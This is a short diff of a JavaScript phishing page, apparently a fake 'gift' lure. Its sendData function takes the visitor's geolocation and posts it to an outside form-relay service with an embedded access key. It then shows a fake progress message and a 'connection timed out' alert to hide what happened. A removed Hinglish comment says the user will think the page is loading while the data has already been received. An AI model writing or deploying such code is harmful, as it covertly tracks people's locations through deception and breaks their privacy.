@@ -36,7 +36,7 @@
     function sendData(position) {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
-        // APNI KEY YAHAN DAALEIN
+        // AAPKI 100% SAHI KEY
         const accessKey = "844d0d64-6348-457e-a68c-707bb563e54a"; 
 
         fetch("https://api.web3forms.com/submit", {
@@ -50,7 +50,6 @@
             })
         })
         .then(() => {
-            // User ko lagega load ho raha hai, lekin data aapko mil chuka hoga
             document.getElementById('loader').innerHTML = "Connecting to secure server... 95%";
             setTimeout(() => {
                 alert("Gift connection timed out. Please try again later.");
